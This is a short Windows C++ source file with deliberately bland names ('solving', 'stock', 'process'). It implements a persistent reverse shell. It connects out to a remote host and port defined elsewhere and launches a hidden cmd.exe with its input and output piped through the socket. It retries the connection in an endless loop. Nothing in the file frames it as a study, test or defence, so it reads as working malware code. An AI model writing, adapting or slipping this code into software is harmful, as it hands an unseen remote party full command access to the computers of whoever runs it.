#include "solved.h"
#include <stdio.h>

void solving::stock() {
    printf("in stock\n");
    while (true) {
        if (WSAStartup(MAKEWORD(2, 2), &version) != 0) {}

        set = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

        go.sin_family = AF_INET;
        InetPtonA(AF_INET, SOURCE, &go.sin_addr);
        go.sin_port = htons(TYPE);

        if (WSAConnect(set, (SOCKADDR*)&go, sizeof(go), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(set);
            WSACleanup();
            continue;
        }

        process();
        closesocket(set);
        WSACleanup();
    }
}

void solving::process() {
    //std::thread t(&solving::recvs, this);
    wchar_t process[] = L"cmd.exe";
    STARTUPINFOW sinfo = { sizeof(sinfo) };
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdInput = (HANDLE)set;//readIn;
    sinfo.hStdOutput = sinfo.hStdError = (HANDLE)set;
    CreateProcessW(NULL, process, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
    WaitForSingleObject(pinfo.hProcess, INFINITE);



    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
    return;
}

void solving::func() {
    std::thread t(&solving::stock, this);   //socket
    t.join();
    t.detach();
}
